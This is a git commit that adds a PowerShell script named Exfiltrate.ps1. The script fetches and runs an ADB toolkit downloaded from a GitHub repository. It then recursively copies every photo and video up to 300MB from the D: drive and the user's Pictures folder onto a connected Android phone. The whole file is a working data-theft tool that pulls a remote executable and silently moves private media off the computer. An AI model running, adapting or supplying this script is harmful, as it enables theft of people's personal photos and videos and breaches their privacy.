5348cfc4ad4f79c30db190afad8c514e1e53723c
D4rk$1d3 <44416061+d4rks1d33@users.noreply.github.com>
2023-12-13 20:30:03 -0300

    Create Exfiltrate.ps1

---
+++ Exfiltrate.ps1
@@ -0,0 +1,24 @@
+$scriptPath = $MyInvocation.MyCommand.Path
+$scriptDirectory = Split-Path $scriptPath
+
+$adbZipUrl = "https://github.com/d4rks1d33/ADB-Tools/raw/main/ADB.zip"
+
+$adbZipPath = Join-Path $env:TEMP "ADB.zip"
+
+Invoke-WebRequest -Uri $adbZipUrl -OutFile $adbZipPath
+
+Expand-Archive -Path $adbZipPath -DestinationPath $env:TEMP -Force
+
+$adbExecutable = Join-Path $env:TEMP "adb.exe"
+
+$androidDestinationPath = "/storage/emulated/0/Documents"
+
+$user = $env:USERNAME
+
+Get-ChildItem -Path "D:\", "C:\Users\$user\Pictures" -Recurse -File -Force |
+    Where-Object { $_.Extension -match '\.(jpg|jpeg|jfif|webp|MOV|mp4)$' -and $_.Length -le 300MB } |
+    ForEach-Object {
+        & $adbExecutable push "$($_.FullName)" "$androidDestinationPath"
+    }
+
+Pause
